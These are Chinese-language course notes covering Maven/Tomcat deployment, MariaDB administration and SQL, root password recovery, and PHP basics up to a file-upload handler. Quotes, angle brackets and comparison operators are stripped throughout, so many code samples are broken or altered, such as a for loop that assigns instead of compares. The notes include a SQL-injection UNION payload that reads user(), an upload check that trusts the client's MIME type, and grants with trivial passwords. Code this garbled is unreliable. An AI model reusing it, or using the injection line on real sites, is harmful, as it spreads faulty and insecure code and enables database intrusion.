上传到我们的tomcat服务器上 cd /opt/unzip 解压一下cd jaden-mastertreevim pom.xml #这个配置文件中有指定，打包的时候打包成war包还是jar包# packagingwar/packaging # 这里写的是打一个war包# 需要安装编译器才能打包，打包指令为mvn，是maven的缩写。 maven编译 # 安装maven编译器wget http://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gztar xf apache-maven-3.6.3-bin.tar.gz -C /usr/local/ # -C是解压到某个目录ln -s /usr/local/apache-maven-3.6.3 /usr/local/maven # 给maven创建一个短一点的路径，文件名称太长了，ln -s是创建软链接的意思，也就是快捷方式的意思。vim /etc/profile#文件结尾添加两行Gexport M2_HOME=/usr/local/mavenexport PATH=$M2_HOME/bin:$PATH:wqsource /etc/profile#验证mvn -v# cd到源代码目录cd jaden-master # 确保该目录下有pom.xml配置文件#打包命令mvn clean package#打包的时间一般都比较长，因为会下载各种打包需要的依赖文件。# 打包完成之后多了一个target目录，在target目录中可以看到SpringBootWeb.war这个打包好的war包。# 把SpringBootWeb.war移动到tomcat的webapps目录中，改个短一些的名字，比如叫做jaden.war# 启动tomcat# 然后访问一下就看到网站效果了。# java代码的打包工具有：maven、gradle、ant等，前两个用的居多。 3.26.5 将网站打包成app打包站点网址：https://appdabao.yimenapp.com/ 四，MySQL4.1 mysql安装#centos7默认安装的是MariaDB-5.5.68或者65，#查看版本的指令：[root@web01 bbs]# rpm -qa| grep mariadb#安装mariadb的最新版，只是更新了软件版本，不会删除之前原有的数据。#修改yum源的配置文件vim /etc/yum.repos.d/mariadb.repoi[mariadb]name=mariadb laster versionbaseurl=http://mirrors.tuna.tsinghua.edu.cn/mariadb/yum/10.6/centos7-amd64/gpgcheck=0#yum安装mariadbyum install mariadb-server -y#重新启动mariadb并设置开机自启systemctl start mariadbsystemctl enable mariadb# 安装完之后建议运行一下安全初始化的动作：mysql_secure_installation 4-2 授权#授权 ，默认情况下mysql和mariadb都是不允许root用户远程连接登录的。# grant 操作(增删改查，all) on 库名.表名 to 用户名@% identified by 密码;grant all on *.* to root@192.168.31.% identified by aini;grant all on wordpress.* to wordpress@192.168.61.% identified by 123456;grant all on wordpress.t1 to jaden@192.168.61.% identified by 123; #jaden用户只能对menu表进行操作# 网站代码中连接数据库的时候使用的是哪个用户，那个用户有什么权限，那么网站代码就能对数据库做什么操作。## 查看某个用户有哪些权限show grants for root@%;# 单独创建用户create user wang@% identified by 123;# 单独创建的用户是没有任何权限的，只能登录，需要授权grant all on wordpress.* to wang@%;# 上面两条就等于我们前面授权加创建用户的一条指令。# 删除用户drop user wang@%;# 查看用户的权限show grants for jaden@192.168.61.%;# 回收权限： 注意：只有在本机登录的root用户才有这个能力revoke select on wordpress.t1 from jaden@192.168.61.%; show grants for jaden@192.168.61.%; 4-3 登录修改密码#使用普通用户登录mysql -u wordpress -p123456 -h 10.0.0.7#默认的数据文件存储位置是/var/lib/mysql/#/root/.mysql_history 记录了我们做的历史sql指令# 修改用户密码#安全初始化，可以修改root用户的密码：mysql_secure_installation格式：mysql set password for 用户名@localhost = password(新密码); 例子：mysql set password for root@localhost = password(123); # 查询当前是在哪个库里面MariaDB [mysql] select database();#查看表结构desc songs;+---------+--------------+------+---- 4-4 MySQL数据类型int 整形 数字 适合存储：年龄， 加减运算float 浮点型 适合存储：余额 加减运算char 字符串 适合存储：不做加减运算 身份号码 密码，单行信息text 文本 适合存储： 适合多行信息，小说，商品描述enum 枚举 适合存储： 固定选项，多选一date 日期类型 适合存储：时间，一般存储的是unix时间戳，从1970.1.1 0:0:0到现在过了多少秒，这个时间戳是可以转化为具体的时间 日期的。boolean 布尔类型 true/false 对应数字就是0/非0 4-5 所有的整型int 4-6 字符串类型 4-7 text类型 4-8 MySQL完整性约束not null # 不能为空，默认是可以为空的default # default 100，意思是默认值为100unique # 唯一auto_increment # 自增primary key #主键：not null+unique，还自带auto_increment自增属性，但是每个表里面只能有一列能为primary key主键列unsigned #只能存正整数，默认是可以存正数和负数的 4-9 MySQL数据表操作#切换库use linux;#创建表 #每个web项目其实都会创建很多个表来存储不同的数据create table 表名(字段名1 类型[(宽度) 约束条件],字段名2 类型[(宽度) 约束条件], 字段名3 类型[(宽度) 约束条件]);示例：mysql create table jaden( - id int, - name varchar(50), - age int(3) - );#查看一下mysql帮我们创建表的时候的详细指令 show create table jaden; #创建库和创建表的时候还可以指定字符集编码，默认字符集是Latin。 DEFAULT CHARACTER SET utf8mb4 create table jaden(id int, name varchar(50)) ENGINE=MyISAM DEFAULT CHARSET=utf8;# ENGINE=MyISAM这是指定存储引擎，这个后面说。#往表里面插入数据 insert into jaden(id,name,age) value(1,xx,18); # 插入单条数据 insert into jaden(id,name,age) values(2,xx2,15),(3,xx3,19); #插入多条数据 #创建只有name列的表t1; create table t1(name char(6));#查看表结构 desc t1;#往表t1插入数据 insert t1 value(zhang); insert t1 value(li);#查询t1表中所有数据 select * from t1;#指定字符集的创表语句 create table t2(name char(6),age int(3)) default charset=utf8;#往表t2插入数据 insert t2 value(张三,20); insert t2 value(李四,60);#创建表t4 create table t4(name char(6),age int(3) default 0 ) default charset=utf8;#指定列插入数据 insert t4(name) values(张三),(李四);#查询结果 mysql select * from t4; +--------+------+ | name | age | +--------+------+ | 张三 | 0 | | 李四 | 0 | +--------+------+ 2 rows in set (0.00 sec)##修改表#修改字段的长度 alter table s2 modify name char(10);#查看创表语句 show create table s2;#增加字段 alter table s2 add age int(3);#删除字段 alter table s2 drop age;#ALTER TABLE 表名 ADD 字段名 数据类型 [完整性约束条件…] FIRST; #添加这个字段的时候，把它放到第一个字段位置去。#ALTER TABLE 表名 ADD 字段名 数据类型 [完整性约束条件…] AFTER 字段名;#after是放到后的这个字段的后面去了，我们通过一个first和一个after就可以将新添加的字段放到表的任意字段位置了。# 修改表的字符集 alter table 表名 charset=utf8mb4;#使用where条件删除单条数据 delete from t5 where name=zhangsan;#删除所有数据 delete from t5;#单条件修改： update t5 set password=123 where name=wangwu;#单条件修改多列： update t5 set password=123,name=xxx where name=wangwu;#多条件修改 update t5 set password=123 where name=wangwu and id=1; update t5 set password=123 where name=wangwu or id=1;#修改所有数据 update t5 set password=123456; 4-10 MySQL查询数据#sql查询## city有多少个中国的城市？select * from city where CountryCode=CHN;## 查询city表中，山西省的城市名？select * from city where district=shanxi;## 查询city表中，山西省和河北省的城市名？select * from city where district=shanxi or district=hebei ;## 查询city表中，山西省和河北省的城市中人口大于100w？select * from city where (district=shanxi or district=hebei) and Population 1000000 ;## 查询city表中，要求只显示城市名和人口数量，山西省和河北省的城市名按人口数量排序，升序？select Name,Population from city where district=shanxi or district=hebeiorder by Population ;## 查询city表中，要求只显示城市名和人口数量，山西省和河北省的城市名按人口数量排序，降序？select Name,Population from city where district=shanxi or district=hebeiorder by Population desc ;## 查询city表中，要求只显示城市名和人口数量，山西省和河北省的城市名按人口数量前5名；select Name,Population from city where district=shanxi or district=hebeiorder by Population desc limit 5;## 查询city表中，要求只显示城市名和人口数量，山西省和河北省的城市名按人口数量第2名和第3名；select Name,Population from city where district=shanxi or district=hebeiorder by Population desc limit 1,2;## 查询city表中,所有中国省份中带an的城市select * from city where countrycode=chn and district like %an% ;## 查询city表中，所有中国的城市人口在89000和89999之间的城市select * from city where countrycode=chn and Population between 89000 and 89999 ;## 查询city表中，要求只显示城市名和人口数量,查询CHN人口最多的前5个城市？## 查询city表中，要求只显示城市名和人口数量,查询CHN人口最少的前5个城市？## 查询中国的城市数量？select count(name) as 中国城市总数 from city where countrycode=CHN;## 查询世界的国家数量？select count(name) from country;## 查询中国的总人口？select sum(population) from city where countrycode=chn;## 把多行合并成一行select group_concat(name) from city where countrycode=chn and district=hebei;## 把多列合并成一列select concat(Name,#,CountryCode,#,District) from city where countrycode=chn and district=hebei ; 4-11 MySQL 索引#增加主键索引(要求结果唯一) alter table t100w add PRIMARY KEY(id);#创建普通索引 alter table t100w add index num(num); #创建联合索引 alter table t100w add index lianhe(k1,k2);#查看索引 show index from t100w;#删除普通索引 alter table t100w drop index lianhe;#删除主键索引 alter table t100w drop PRIMARY key;#创建表的时候，指定索引 create table zhu2(id int(8) primary key AUTO_INCREMENT ,name char(10),passwd char(10)); 4-12 MySQL Union#合并两个select查询结果CREATE TABLE `c1` ( `ID` int NOT NULL AUTO_INCREMENT, `Name` char(35) NOT NULL DEFAULT , `District` char(20) NOT NULL DEFAULT , `Population` int NOT NULL DEFAULT 0, PRIMARY KEY (`ID`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;CREATE TABLE `c2` ( `ID` int NOT NULL AUTO_INCREMENT, `Name` char(35) NOT NULL DEFAULT , `District` char(20) NOT NULL DEFAULT , `Population` int NOT NULL DEFAULT 0, PRIMARY KEY (`ID`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;insert into c1(ID,Name,District,Population) select ID,Name,District,Population from city where CountryCode=CHN and District=Hebei;insert into c2(ID,Name,District,Population) select ID,Name,District,Population from city where CountryCode=CHN and District=Henan;select * from c1 union select * from c2 order by Population;#sql注入中经常会使用的select * from c1 union select 1,2,3,user(); 4-13 mysql存储引擎MyISAM： ## 读性能好，写的性能差 表级锁 每张表，三个文件innodb： ## 读性能微弱，写的性能好 行级锁 每张表，两个文件 4-14 MySQL找回root密码#b适用于mariadb 10.61.修改配置文件 vim /etc/my.cnf.d/server.cnf [mysqld] skip-grant-tables 2.启动mariadb systemctl start mariadb 3.空密码 登录数据库并执行修改密码 use mysql; update user set password=password(123) where user=root and host=localhost; flush privileges; 4.删除配置文件中前面增加的skip-grant-tables5.重启启动mariadb systemctl restart mariadb6.使用新密码验证 mysql -uroot -p123 五，PHP1，变量和常量#PHP 中的变量用一个美元符号后面跟变量名来表示。变量名是区分大小写的。#定义一个变量，前面不加$符号，那么就是普通字符 $num = 3.1415; $a = 5; $b = 6; echo $a + $b; $hello world# 定义常量：# 常量的名一般都是大写字母 // 方式1：define(常量名, 常量值); 例如：define(WebSite, php中文网);// 方式2：const 常量名 = 常量值; 例如：const FOO = BAR;// 方式2不能用在if判断中。 2,不带符号，单引号，双引号的区别?phpheader(Content-Type: text/html; charset=utf-8); // 在响应头中添加了content-type: // utf-8，header()是php提供的加工响应头键值对的// header(jaden: 666); $name = kobe;echo $name;echo 最喜欢的NBA球星是.$name.br; //变量不加符号，遇到字符串拼接，需要加.连接echo 最喜欢的NBA球星是$namebr; //单引号，不解析变量，原样输出echo 最喜欢的NBA球星是$namebr; //双引号，解析变量? 3,php的数据类型◾布尔类型 0 非0 |false true # 判断条件的结果都是布尔值◾整型 整数 -99999 +99999◾浮点型 小数 -1.9 3.25 3.00005◾字符串 hello hello ◾数组 array， 例如：$d = array(a, 1,c,array(1,2,3)); #数组是容器类型的数据，可以存放各种类型的基础数据 $d = array(a, 1,c,array(1,2,3)); echo $d; //会报错，因为echo是用来输出字符串类型数据的。 echo $d[0]; # 数组类型是可以通过索引取值的，索引是从0开始的。◾对象 object # 这个需要学到类之后才能看到◾资源类型 Resource # 文件等资源数据◾NULL 空 # $a = null; 提前定义，但是不想赋值的时候就可以这样用 ## 查看变量对应值的类型： // 1.使用“gettype(传入一个变量var)”来显示变量var的类型; 只会显示类型 // 2.使用“var_dump(传入一个变量var)”来显示变量var的类型; 会显示具体内容打印array： $a = array(1,2,3); print_r($a); 4,php 运算符4-1 算数运算符存在优先级 （乘除 加减），提升优先级就加括号。 4-2 自增自减 4-3 比较运算符 4-4 赋值运算符 4-5 逻辑运算符 4-6 三元运算?php $x = true; $x ? $y = 5 : $y = 6; //输出5 echo $y;? 5 PHP流程控制5-1 if?phpheader(Content-Type: text/html; charset=utf-8);$a=rand(1,10);if ($a 5) echo 随机点数比较大;echo br;echo 当前的点数是.$a;? 5-2 else?phpheader(Content-Type: text/html; charset=utf-8);$user = $_POST[username];$pass = $_POST[password];if ($user ==admin and $pass ==123456 ) echo 登录成功;else echo 登录失败;? 5-3 elseifelse if?php// A B C 其他$jixiao=F;if ($jixiao == A) echo 发放1.2倍薪资; elseif ( $jixiao ==B) echo 正常发放薪资;else if($jixiao == C) echo 发放90%薪资;else echo 发放80%薪资;? 5-4 while?php$i = 1;while ($i = 10) $i++; echo 哈哈.$i.次; ? 5-5 do…while?php$i = 0;do echo $i; while ($i 0);? 5-6 for#$i=1初始值，$i=10 条件，$i++每次加1for ($i = 1; $i = 10; $i++) echo $i; 5-7 foreach# 属组的索引默认是从0开始的数字，也可以自行指定索引$cars=array(特等奖=布加迪,一等奖=捷豹 ,二等奖=法拉利 ,三等奖=玛莎拉蒂);foreach ($cars as $key = $value) echo trtd$key/tdtd$value/td/tr; 5-8 break$cars=array(特等奖=布加迪,一等奖=捷豹 ,二等奖=法拉利 ,三等奖=玛莎拉蒂,四等奖=迈凯伦);foreach ($cars as $key = $value) if ( $key == 三等奖 ) break; else echo $key.是.$value.br; 5-9 continue$cars=array(特等奖=布加迪,一等奖=捷豹 ,二等奖=法拉利 ,三等奖=玛莎拉蒂,四等奖=迈凯伦);foreach ($cars as $key = $value) if ( $key == 三等奖 ) continue; else echo $key.是.$value.br; 5-10 switch$a=5;$b=10;$c=4; //switch ($c) case 1: echo $a + $b = .($a+$b).br; break; case 2: echo $a - $b = .($a-$b).br; break; case 3: echo $a * $b = .($a*$b).br; break; case 4: echo $a / $b = .($a/$b).br; break; default: // 条件都不成立时执行 echo 原来啥也不是; break; 6,php函数//不支持传参的函数function welcom() echo 欢迎光临!;//调用函数welcom();?phpheader(Content-Type: text/html; charset=utf-8); // 在响应头中添加了content-type: utf-8，header()是php提供的加工响应头键值对的echo 做一下加法计算！.br;// 函数声明，提前定义了两个形式参数：$a, $bfunction add($a, $b) //$a = 2; //$b = 3; $c = $a + $b; echo 加法计算结果为：.$c.br; // 函数调用： 3，4实际参数add(3,4); echo 计算结束...br;?//返回值// 函数声明，提前定义了两个形式参数：$a, $bfunction add($a, $b) //$a = 2; //$b = 3; $c = $a + $b; // echo 加法计算结果为：.$c.br; return $c; // 函数调用： 3，4实际参数$ret = add(3,4);echo $ret.br; echo 计算结束...br; 7，内置函数7-1 文件包含的函数 7-2 数学常用函数 7-3 字符串常用函数echo FILE; 打印当前文件的绝对路径。下面函数大家学习一下我标着 *** 的即可 echo __FiLE__./br; // D:\\ruanjian\\phpstudy_pro\\WWW\\index.phpecho dirname(__FILE__)./br; // D:\\ruanjian\\phpstudy_pro\\WWW 7-4 时间日期函数// 时区的报错，修改php.ini，date.timezone = Asia/Shanghai$d = date(Ymd H:i:s); # 格式化时间日期的。$d = date(Ymd H:i:s, 1661910865); # 通过某个时间戳来格式化时间$t = time(); # 当前时间戳?php $mytime = getdate(); // 得到当前时间日期的一个属组 // $mytime = getdate(1661910865); echo 年 :.$mytime[year].br; echo 月 :.$mytime[mon].br; echo 日 :.$mytime[mday].br; echo 时 :.$mytime[hours].br; echo 分 :.$mytime[minutes].br; echo 秒 :.$mytime[seconds].br; echo 一个小时中的第几钟 :.$mytime[minutes].br; echo 这是一分钟的第几秒 :.$mytime[seconds].br; echo 星期名称 :.$mytime[weekday].br; echo 月份名称 :.$mytime[month].br; echo 时间戳 :.$mytime[0].br;? 7-5 数组常用函数主要是数组元素的增删改查操作。 ?phpheader(Content-Type: text/html; charset=utf-8); // 在响应头中添加了content-type: utf-8，header()是php提供的加工响应头键值对的$a = array(aa, bb, 33, 55);echo $a[0].br;echo var_dump($a).br;$a[5] = kk;echo var_dump($a).br;$a[1] = cc;echo var_dump($a).br;//unset()删除unset($a[1]);echo var_dump($a).br;? 8,php文件和目录操作readfile() //读取文件内容，并返回文件的长度，这个没啥用file_get_contents(文件路径) //读取文件，支持本地文件和远程文件urlfile_put_contents(文件路径, 内容) //保存文件// readfile会自动打印文件内容，$a = readfile(1.txt);echo br;echo $a; //文件长度// 写入数据 $a = aabbkkdd;file_put_contents(1.txt, $a); // 没有文件会自动创建$b = ooooo;file_put_contents(1.txt, $b); // 每次写入新数据都会先清空原文件数据//读取文件内容$a = file_get_contents(1.txt);$a = file_get_contents(http://www.baidu.com/img/flexible/logo/pc/result.png); //直接请求https的网址会报错，休要修改配置，1.windows下的PHP，只需要到php.ini中把extension=php_openssl.dll前面的;删掉，重启服务就可以了。2.linux下的PHP，就必须安装openssl模块，安装好了以后就可以访问了。// file_put_contents(1.txt, $a) # 直接将读取的文件输入写入到本地文件中echo $a;# 注意：文件读写的内容都是字符串数据格式。 8-1 fopenfopen、fread、fwrite、fclose操作读取文件。 resource fopen ( string $文件名, string 模式) string fread ( resource $操作资源(也就是文件路径), int 读取长度) bool fclose ( resource $操作资源 ) 注：resource 、string、bool表示的是方法的返回值 。 $a = fopen(1.txt, r)#$b = fread($a,18);$b = fgets($a);echo $b.br;while(!feof($a)) // !feof($a)表示如果读到文件最后了。 $b = fgets($a); echo $b.br; $b = fwrite($a, aaaaa); //失败返回false，成功就返回写入的字符个数echo $b.br;if ($b == false) // r模式打开的文件不能写入,r+模式可以写，但是会从文件内容开头覆盖原有内容 echo 写入失败;#fclose($a); 9，目录处理1.读取某个路径的时候判断是否是文件夹2.是文件夹的话，打开指定文件夹，返回文件目录的资源变量3.使用readdir读取一次目录中的文件，目录指针向后偏移一次4.使用readdir读取到最后，没有可读的文件返回false5.关闭文件目录 例如：列举当前目录列表 $a = dirname(__FILE__); // php多行注释/* 注释内容 */echo br;$b = scandir($a);var_dump($b);foreach ($b as $key=$filename) if ($filename == . or $filename == .. ) continue; echo $filename.br;# 判断类型filetype($a.\\wp);filetype($a.\\1.txt); 示例:查看D盘下的文件和文件夹，并输出他们的类型 ?php //设置打开的目录是D盘 $dir = C:/phpStudy/PHPTutorial/WWW; //判断是否是文件夹，是文件夹 if (is_dir($dir)) if ($dh = opendir($dir)) //读取到最后返回false，停止循环 // while中的条件表示：将readdir每次读取的数据赋值给$file,然后比较$file是否等于false，如果等false，那么while循环结束 while (($file = readdir($dh)) !== false) echo 文件名为: $file : 文件的类型是: . filetype($dir ./. $file) . br /; closedir($dh); ? 10.PHP创建临时文件我们之前创建的文件都是永久文件。 而创建临时文件在我们平时的项目开发中也非常有用。创建临时文件的几个好处：用完后即删除，不需要去维护这个文件的删除状态。 ?php //创建了一个临时文件 $handle = tmpfile(); //向里面写入了数据 $numbytes = fwrite($handle, 写入临时文件); // sleep(60); //关闭临时文件，文件即被删除 fclose($handle); echo 向临时文件中写入了.$numbytes . 个字节;?//windows存储在C:\\Users\\用户名\\AppData\\Local\\Temp目录中 11，PHP拷贝，移动，删除文件11-1 重命名我们日常在处理文件的时候，可以删除文件、重命名文件也可以也可复制文件。 我们先来说重命名，重命名的函数是： bool rename($ 旧名, $新名); ，方法的返回结果是布尔值。这个函数返回一个bool值，将旧的名字改为新的名字。 ?php //旧文件名 $filename = test.txt; //新文件名 $filename2 = $filename . .xx; //修改文件名称 rename($filename, $filename2); //移动文件，比如移动到xx目录下 rename($filename, \\\\xx\\\\.$filename2);? 11-2 复制文件复制文件，就相当于是克隆技术，将一个原来的东西再克隆成一个新的东西。两个长得一模一样。 bool copy(源文件,目标文件)功能：将指定路径的源文件，复制一份到目标文件的位置。 我们来通过实验和代码来玩玩： ?php //旧文件名 $filename = copy.txt; //新文件名 $filename2 = $filename . _new; //修改名字。 copy($filename, $filename2);? 11-3 删除文件删除文件就是将指定路径的一个文件删除，不过这个删除是直接删除。使用的是windows电脑，你在回收站看不到这个文件。你只会发现，这个文件消失了。 bool unlink(指定路径的文件) ?php $filename = test2.txt; if (unlink($filename)) echo 删除文件成功 $filename! ; else echo 删除 $filename 失败! ; ? 12，文件属性操作比如，检测一下xx.txt文件是否存在 ?php if(file_exists(文件路径)) echo 文件已存在; exit; ? 常用文件属性操作 bool file_exists ( $指定文件名或者文件路径)## 功能：文件是否存在。bool is_readable ( $指定文件名或者文件路径)## 功能：文件是否可读bool is_writeable ( $指定文件名或者文件路径) ### 功能：文件是否可写bool is_executable ( $指定文件名或者文件路径)## 功能：文件是否可执行bool is_file ( $指定文件名或者文件路径)## 功能：是否是文件bool is_dir ( $指定文件名或者文件路径)## 功能：是否是目录void clearstatcache ( void ) pass它## 功能：清除文件的状态缓存 13，PHP文件权限设置chmod 主要是修改文件的的权限。主要是针对linux系统的，这个我们前面学过，就不多说了。 ?php //修改linux 系统/var/wwwroot/某文件权限为755 chmod(/var/wwwroot/index.html, 755); chmod(/var/wwwroot/index.html, u+rwx,go+rx); chmod(/somedir/somefile, 0755); ? 权限说明（r-读，w-写，x执行，d-表示文件夹，u-当前用户，g-当前用户所在组，o-其他用户） 14，PHP文件路径函数我们经常会遇到处理文件路径的情况。 例如： 1.文件后缀需要取出来 2.路径需要取出名字不取目录 3.只需要取出路径名中的目录路径 4.或者把网址中的各个部份进行解析取得独立值 5.甚至是自己组成一个url出来 ... .... 很多地方都需要用路径处理类的函数。 我们把常用的路径处理函数为大家做了标注，大家对着这个路径处理函数进行处理即可： 示例，记住示例中的几个即可 ?php $path_parts = pathinfo(d:/www/index.inc.php); echo 文件目录名：.$path_parts[dirname].br /; echo 文件全名：.$path_parts[basename].br /; echo 文件扩展名：.$path_parts[extension].br /; echo 不包含扩展的文件名：.$path_parts[filename].br /; ? 15，PHP文件上传在web常见漏洞中有一个文件上传的漏洞，后面我们会讲到。 在我们日常使用中经常会遇到很多种这样的情况： 文件上传需要注意php.ini这个配置文件，这个文件我们在phpstudy中就能看到 打开文件位置，找到php.ini文件，并打开 只有 file_uploads on 时，php才能支持上传文件 phpinfo()函数，也可以看到这些配置信息。 15-1 配置项： 建议尺寸： file_size(文件大小) upload_max_filesize post_max_size memory_limit 另外，需要注意的是脚本执行时间，max_execution_time配置，这个参数的单位为秒。它是设定脚本的最大执行时间。也可以根据需求做适当的改变。通常不需要来修改，系统默认值即可。超大文件上传的时候，可能会涉及到这一项参数的修改。上传时间太长了，会超时。如果你将此项参数设为0，则是不限制超时时间，不建议使用，文件太大了，想别的方式处理，一般会分块传输 。 完成了php.ini的相关配置，我们就可以开始试着完成第一次文件上传了。别忘了重启服务。 15-2 通过php获取webserver相关配置信息的代码?phpheader(Content-Type: text/html; charset=utf-8); // 在响应头中添加了content-type: utf-8，header()是php提供的加工响应头键值对的$a = $_SERVER[HTTP_HOST];$b = $_SERVER[HTTP_USER_AGENT];echo $a.br;echo $b.br;? 15-3 上传文件步骤15-3-1.系统返回的错误码详解 注：错误码中没有5。 15-3- 2.自定义判断是否超出文件大小范围在开发上传功能时。我们作为开发人员，除了php.ini中规定的上传的最大值外。我们通常还会设定一个值，是业务规定的上传大小限制。 例如： ## 新浪微博或者QQ空间只准单张头像图片2M。而在上传图册的时候又可以超过2M来上传。## 所以说，它的系统是支持更大文件上传的。## 此处的判断文件大小，我们用于限制实际业务中我们想要规定的上传的文件大小。 15-3- 3.判断后缀名和mime类型是否符合在网络世界里面也有坏人。他们会把图片插入病毒，在附件中上传病毒，他们会在网页中插入病毒或者黄色图片。 我们需要对于上传的文件后缀和mime类型都要进行判断才可以 /* 百度解释：MIME(Multipurpose Internet Mail Extensions)是多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。 通俗解释： 有兴趣看一看 其实MIME更像是一种协议。 首先，我们要了解浏览器是如何处理内容的。在浏览器中显示的内容有 HTML、有 XML、有 GIF、还有Flash ……那么，浏览器是如何区分它们，决定什么内容用什么形式来显示呢？答案是 MIME Type，也就是该资源的媒体类型。 媒体类型通常是通过 HTTP 协议，由 Web 服务器告知浏览器的，更准确地说，是通过 Content\u0002Type 来表示的，例如:Content-Type: text/HTML,表示内容是 text/HTML 类型，也就是超文本文件。为什么是“text/HTML”而不是“HTML/text”或者别的什么？MIME Type 不是个人指定的，是经过 ietf 组织协商，以 RFC 的形式作为建议的标准发布在网上的，大多数的 Web 服务器和用户代理都会支持这个规范 (顺便说一句，Email 附件的类型也是通过MIME Type 指定的)。 通常只有一些在互联网上获得广泛应用的格式才会获得一个 MIME Type，如果是某个客户端自己定义的格式，一般只能以 application/x- 开头。 XHTML 正是一个获得广泛应用的格式，因此，在 RFC 3236 中，说明了 XHTML 格式文件的 MIME Type 应该是 application/xHTML+XML。 当然，处理本地的文件，在没有人告诉浏览器某个文件的 MIME Type 的情况下，浏览器也会做一些默认的处理，这可能和你在操作系统中给文件配置的 MIME Type 有关。比如在 Windows 下，打开注册表的“HKEY_LOCAL_MACHINESOFTWAREClassesMIMEDatabaseContent Type”主键，你可以看到所有 MIME Type 的配置信息。 在把输出结果传送到浏览器上的时候，浏览器必须启动适当的应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。在HTTP中，MIME类型被定义在Content-Type header中 例如，假设你要传送一个Microsoft Excel文件到客户端。那么这时的MIME类型就是“application/vnd.ms-excel”。在大多数实际情况中，这个文件然后将传送给Execl来处理（假设我们设定Execl为处理特殊MIME类型的应用程序）。在ASP中，设定MIME类型的方法是通过Response对象的ContentType属性。 多媒体文件格式MIME 最早的HTTP协议中，并没有附加的数据类型信息，所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。 MIME意为多目Internet邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。然而当它被HTTP协议支持之后，它的意义就更为显著了。它使得HTTP传输的不仅是普通的文本，而变得丰富多彩。 每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。常见的MIME类型 超文本标记语言文本 .html,.html text/html 普通文本 .txt text/plain RTF文本 .rtf application/rtf GIF图形 .gif image/gif JPEG图形 .ipeg,.jpg image/jpeg au声音文件 .au audio/basic MIDI音乐文件 mid,.midi audio/midi,audio/x-midi RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio MPEG文件 .mpg,.mpeg video/mpeg AVI文件 .avi video/x-msvideo GZIP文件 .gz application/x-gzip TAR文件 .tar application/x-tar Internet中有一个专门组织IANA来确认标准的MIME类型，但Internet发展的太快，很多应用程序等不及IANA来确认他们使用的MIME类型为标准类型。因此他们使用在类别中以x-开头的方法标识这个类别还没有成为标准，例如：x-gzip，x-tar等。事实上这些类型运用的很广泛，已经成为了事实标准。只要客户机和服务器共同承认这个MIME类型，即使它是不标准的类型也没有关系，客户程序就能根据MIME类型，采用具体的处理手段来处理数据。而Web服务器和浏览器（包括操作系统）中，缺省都设置了标准的和常见的MIME类型，只有对于不常见的 MIME类型，才需要同时设置服务器和客户浏览器，以进行识别。 由于MIME类型与文档的后缀相关，因此服务器使用文档的后缀来区分不同文件的MIME类型，服务器中必须定义文档后缀和MIME类型之间的对应关系。而客户程序从服务器上接收数据的时候，它只是从服务器接受数据流，并不了解文档的名字，因此服务器必须使用附加信息来告诉客户程序数据的MIME类型。服务器在发送真正的数据之前，就要先发送标志数据的MIME类型的信息，这个信息使用Content-type关键字进行定义，例如 对于HTML文档，服务器将首先发送以下两行MIME标识信息,这个标识并不是真正的数据文件的一部分。 Content-type: text/html 注意，第二行为一个空行，这是必须的，使用这个空行的目的是将MIME信息与真正的数据内容分隔开。MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。 MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。官方的 MIME 信息是由 Internet Engineering Task Force (IETF) 在下面的文档中提供的： RFC-822 Standard for ARPA Internet text messages RFC-2045 MIME Part 1: Format of Internet Message Bodies RFC-2046 MIME Part 2: Media Types RFC-2047 MIME Part 3: Header Extensions for Non-ASCII Text RFC-2048 MIME Part 4: Registration Procedures RFC-2049 MIME Part 5: Conformance Criteria and Examples不同的应用程序支持不同的 MIME 类型。 */ 15-3-4.生成文件名我们的文件上传成功了，不会让它保存原名。因为，有些人在原名中有敏感关键词会违反我国的相关法律和法规。我们可以采用date()、mt_rand()或者unique()生成随机的文件名。 15-3-5.判断是否是上传文件文件上传成功时，系统会将上传的临时文件上传到系统的临时目录中。产生一个临时文件。同时会产生临时文件名。我们需要做的事情是将临时文件移动到系统的指定目录中。而移动前不能瞎移动，或者移动错了都是不科学的。移动前我们需要使用相关函数判断上传的文件是不是通过 HTTP POST 上传的，is_uploaded_file()传入一个参数($_FILES中的缓存文件名)，is_uploaded_file() 函数检查指定的文件是否是通过 HTTP POST 上传的，如果文件是通过 HTTP POST 上传的，该函数返回 TRUE。 15-3-6.移动临时文件到指定位置临时文件是真实的临时文件，我们需要将其移动到我们的网站目录下面了。让我们网站目录的数据，其他人可以访问到，我们使用： move_uploaded_file() 。这个函数是将上传文件移动到指定位置，并命名。 需要传入两个参数： 第一个参数是指定移动的上传文件； 第二个参数是指定的文件夹和名称拼接的字符串。 大致步骤 15-3-7 php 文件上传表单注意事项代码示例 创建index.html文件，内容如下 !DOCTYPE htmlhtml lang=enhead meta charset=UTF-8 titleTitle/title/headbody h1上传文件/h1 form action=chuli.php method=post enctype=multipart/form-data 请选择文件：input type=file name=file /input type=submit value=上传 / /form/body/html 注意事项： 1.form 表单中的参数method 必须为post。若为get是无法进行文件上传的 2.enctype须为multipartform-data 再创建一个php文件，比如叫做chuli.php ?php //取文件信息 $arr = $_FILES[file]; // 拿到的是文件描述信息的数组 //var_dump($arr); // 获取文件扩展名，可以用到pathinfo()函数 //加限制条件 //1.文件类型 //2.文件大小 //3.保存的文件名不重复 if(($arr[type]==image/jpeg || $arr[type]==image/png ) $arr[size]10241000 ) //临时文件的路径 $arr[tmp_name]; //上传的文件存放的位置 //避免文件重复: //加时间戳.time()加用户名.$uid或者加.date(YmdHis) $filename = ./images/.date(YmdHis).$arr[name]; 